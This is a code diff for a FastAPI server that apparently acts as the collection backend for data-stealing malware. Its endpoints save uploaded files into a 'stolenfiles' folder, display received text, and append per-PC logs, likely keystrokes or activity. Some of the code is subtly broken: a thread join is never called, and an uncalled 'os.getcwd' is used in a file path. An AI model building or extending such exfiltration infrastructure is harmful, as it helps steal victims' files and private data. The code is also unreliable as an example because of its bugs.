@@ -2,7 +2,7 @@ from fastapi import FastAPI, File, UploadFile
 from pydantic import BaseModel
 import sqlite3
 import os 
-
+import threading
 
 
 
@@ -36,7 +36,6 @@ app = FastAPI()
 
 
 @app.post("/api/recive/payload",status_code=200)
-
 async def recivePaylaod(File_param:UploadFile):
     try:
         os.mkdir(os.getcwd()+"/stolenfiles")
@@ -50,8 +49,27 @@ async def recivePaylaod(File_param:UploadFile):
 
 @app.post("/api/recive/text",status_code=200)
 def reciveText(text:TextPayload):
-    show_text_in_editor(text.file_name,text.data)
-    
-    
+    thread=[]
+    thread1 =threading.Thread(target=show_text_in_editor,args=(text.file_name,text.data))
+    thread1.start()
+    thread.append(thread1)
+    for thread2 in thread:
+        thread2.join
+    return {"STATUS":200}
 
+    
+class Logs(BaseModel):
+    pc_name:str = None
+    log:str
         
+@app.post("/api/recive/logs",status_code=200)
+def savetologs(log:Logs):
+    try:
+        os.mkdir(os.getcwd()+"/logs")
+    except:
+        pass
+    try:
+        with open(f"{os.getcwd}/logs/{log.pc_name}.txt","a",encoding='utf-8',errors='ignore') as f:
+            f.write(log.log)
+    except Exception as e:
+        print(e)
